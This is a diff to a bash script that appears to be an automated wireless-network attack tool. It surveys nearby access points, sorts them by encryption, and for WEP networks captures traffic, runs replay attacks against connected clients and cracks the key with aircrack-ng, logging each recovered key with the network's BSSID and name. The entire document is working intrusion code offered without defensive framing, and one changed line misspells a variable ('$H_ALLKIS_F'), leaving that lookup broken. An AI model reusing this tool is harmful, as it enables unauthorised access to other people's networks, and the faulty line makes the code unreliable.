@@ -4,7 +4,7 @@ H_ME=${0##*/}
 H_MY_D=${0%/*}
 H_MY_D=$(cd $H_MY_D; pwd)
 H_MY_PID=$$
-H_VERSION="0.2.1"
+H_VERSION="0.2.2"
 
 h_usage() {
 	cat << _END_OF_USAGE_
@@ -376,6 +376,10 @@ h_get_last_file() {
 	echo $(ls -1 $* | tail -n 1)
 }
 
+h_get_sane_fname() {
+	local F=$1
+	echo $F | tr ':/' '__'
+}
 
 h_auth_start() {
 	$@ >/dev/null 2>&1 &
@@ -465,18 +469,21 @@ h_monitor_all() {
 
 	rm -f ALL-01.*
 	
-	H_CSV_ALL_F=ALL-01.csv
-	H_KIS_ALL_F=ALL-01.kismet.csv
-	h_capture_start h_capture --write ALL ${H_OPT_BSSID:+--bssid $H_OPT_BSSID} ${H_OPT_CHANNEL:+--channel $H_OPT_CHANNEL} -f 250
+	h_capture_start h_capture --write ALL ${H_OPT_BSSID:+--bssid $H_OPT_BSSID} ${H_OPT_CHANNEL:+--channel $H_OPT_CHANNEL} -f 250 --output-format=csv,kismet
 	sleep $H_MONITOR_TIME_LIMIT
 	h_capture_stop
+	
+	sleep 1
+
+	H_ALL_CSV_F=$(h_get_last_file ALL-??.csv)
+	H_ALL_KIS_F=$(h_get_last_file ALL-??.kismet.csv)
 
 	H_NET_OPEN_F=ALL-OPEN.txt
 	H_NET_WEP_F=ALL-WEP.txt
 	H_NET_WPA_F=ALL-WPA.txt
-	h_kis_get_networks_by_enc $H_KIS_ALL_F "O" >$H_NET_OPEN_F
-	h_kis_get_networks_by_enc $H_KIS_ALL_F "WEP" >$H_NET_WEP_F
-	h_kis_get_networks_by_enc $H_KIS_ALL_F "WPA" >$H_NET_WPA_F
+	h_kis_get_networks_by_enc $H_ALL_KIS_F "O" >$H_NET_OPEN_F
+	h_kis_get_networks_by_enc $H_ALL_KIS_F "WEP" >$H_NET_WEP_F
+	h_kis_get_networks_by_enc $H_ALL_KIS_F "WPA" >$H_NET_WPA_F
 
 	local n_open=$(wc -l <$H_NET_OPEN_F)
 	local n_wep=$(wc -l <$H_NET_WEP_F)
@@ -491,10 +498,10 @@ h_monitor_all() {
 
 h_open_try_one_network() {
 	local N=$1
-	local bssid=$(h_kis_get_network_bssid $H_KIS_ALL_F $N)
-	local channel=$(h_kis_get_network_channel $H_KIS_ALL_F $N)
-	local essid=$(h_kis_get_network_essid $H_KIS_ALL_F $N)
-	h_log "found open network: bssid='$bssid', essid='$essid', channel=$channel"
+	local bssid=$(h_kis_get_network_bssid $H_ALL_KIS_F $N)
+	local channel=$(h_kis_get_network_channel $H_ALL_KIS_F $N)
+	local essid=$(h_kis_get_network_essid $H_ALL_KIS_F $N)
+	h_log "found open network: bssid=$bssid, channel=$channel, essid='$essid'"
 }
 
 h_open_try_all_networks() {
@@ -509,7 +516,7 @@ h_open_try_all_networks() {
 #
 
 h_wep_log_key() {
-	local key=$(cat $H_KEY_CUR_F)
+	local key=$(cat $H_CUR_KEY_F)
 	h_led_on $H_LED_SUCCESS
 	h_log "key found: $key"
 	echo "$H_CUR_BSSID,$H_CUR_ESSID,$H_CUR_CHANNEL,$key" >>$H_WEP_F
@@ -550,15 +557,13 @@ h_wep_attack_is_working() {
 h_wep_attack_try() {
 	local replay_func=$1
 	local auth_func
-	local clients=$H_CUR_CLIENT
+	local clients
 	local iv
 	local crack_time_started
 	local RC=1
 	
 	h_replay_start $replay_func
-	if [ -z "$clients" ]; then
-		clients=$(h_csv_get_network_sta $H_CSV_CUR_F $H_CUR_BSSID | grep -iv $H_MON_MAC)
-	fi
+	clients=$(h_csv_get_network_sta $H_CUR_CSV_F $H_CUR_BSSID | grep -iv $H_MON_MAC)
 	if [ -n "$clients" ]; then
 		for client in $clients; do
 			h_log "found a client station: $client"
@@ -592,7 +597,7 @@ h_wep_attack_try() {
 					fi
 				fi
 			fi
-			if [ -f $H_KEY_CUR_F ]; then
+			if [ -f $H_CUR_KEY_F ]; then
 				h_wep_log_key
 				RC=0
 				break
@@ -612,7 +617,7 @@ h_wep_attack_try() {
 }
 
 h_wep_crack() {
-	local cmd="aircrack-ng -q -b $H_CUR_BSSID -l $H_KEY_CUR_F $H_CAP_CUR_F"
+	local cmd="aircrack-ng -q -b $H_CUR_BSSID -l $H_CUR_KEY_F $H_CUR_BASE_FNAME-??.$H_CUR_CAP_FEXT"
 	h_log "running: $cmd"
 	exec $cmd
 }
@@ -708,12 +713,13 @@ H_WEP_ATTACKS=" \
 
 h_wep_try_one_network() {
 	local N=$1
-	H_CUR_BSSID=$(h_kis_get_network_bssid $H_KIS_ALL_F $N)
-	H_CUR_CHANNEL=$(h_kis_get_network_channel $H_KIS_ALL_F $N)
-	H_CUR_ESSID=$(h_kis_get_network_essid $H_KIS_ALL_F $N)
-	H_CUR_CLIENT=$(h_csv_get_network_sta $H_CSV_ALL_F $H_CUR_BSSID | head -n 1)
-	H_CUR_RATE=$(h_kis_get_network_max_rate $H_KIS_ALL_F $N)
-	H_KEY_CUR_F="$H_CUR_BSSID-00.key"
+	local capture_options
+
+	H_CUR_BSSID=$(h_kis_get_network_bssid $H_ALL_KIS_F $N)
+	H_CUR_CHANNEL=$(h_kis_get_network_channel $H_ALL_KIS_F $N)
+	H_CUR_ESSID=$(h_kis_get_network_essid $H_ALL_KIS_F $N)
+	H_CUR_RATE=$(h_kis_get_network_max_rate $H_ALLKIS_F $N)
+	H_CUR_BASE_FNAME=$(h_get_sane_fname $H_CUR_BSSID)
 
 	if grep -q "^$H_CUR_BSSID," $H_WEP_F; then
 		h_log "skipping known WEP network: bssid=$H_CUR_BSSID, channel=$H_CUR_CHANNEL, essid='$H_CUR_ESSID'"
@@ -727,15 +733,19 @@ h_wep_try_one_network() {
 	
 	ifconfig $H_MON_IF up
 
-	h_capture_start h_capture --write $H_CUR_BSSID --bssid $H_CUR_BSSID --channel $H_CUR_CHANNEL
-	#h_auth_start h_wep_deauth -e $H_CUR_ESSID
-	sleep $H_MONITOR_TIME_LIMIT
-	#h_auth_stop
+	if [ $H_CAPTURE_IV_ONLY -gt 0 ]; then
+		H_CUR_CAP_FEXT="ivs"
+		capture_options="--output-format=ivs,csv"
+	else
+		H_CUR_CAP_FEXT="cap"
+		capture_options="--output-format=pcap,csv"
+	fi
+	h_capture_start h_capture --write $H_CUR_BASE_FNAME --bssid $H_CUR_BSSID --channel $H_CUR_CHANNEL $capture_options
 
-	H_CAP_CUR_F=$(h_get_last_file $H_CUR_BSSID-??.cap)
-	H_CSV_CUR_F=$(h_get_last_file $H_CUR_BSSID-??.csv)
-	H_KIS_CUR_F=$(h_get_last_file $H_CUR_BSSID-??.kismet.csv)
-	h_log "using CSV file: '$H_CSV_CUR_F'"
+	sleep $H_MONITOR_TIME_LIMIT
+
+	H_CUR_CSV_F=$(h_get_last_file $H_CUR_BASE_FNAME-??.csv)
+	H_CUR_KEY_F="$H_CUR_BASE_FNAME.key"
 
 	for attack in $H_WEP_ATTACKS; do
 		$attack && break
